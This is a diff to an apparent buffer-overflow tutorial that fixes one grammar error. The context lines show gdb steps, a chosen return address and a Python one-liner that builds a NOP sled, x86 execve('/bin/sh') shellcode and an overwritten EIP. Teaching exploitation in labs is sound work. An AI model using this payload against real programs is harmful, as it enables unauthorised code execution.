@@ -216,7 +216,7 @@ b *0x0804849c
 
 - We can clearly see all the NOPs, the shellcode and CCCC at EIP address `xffffd63c`
 - Next step is the execution of our shellcode. To do so, we need to place an address inside EIP which redirects into our NOP field
-- If so, all NOPs gets executed (without no effect upon the running program) until it reaches our shellcode
+- If so, all NOPs gets executed (with no effect upon the running program) until it reaches our shellcode
 - From the picture above we can select any memory address from NOP: `0xffffd608` as example
 - Remember to write in little-endian order: `\x08\xd6\xff\xff`
 - Interim result #2: `r $(python -c "print '\x90' * (136-4-28) + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\x18\xd6\xff\xff'")`
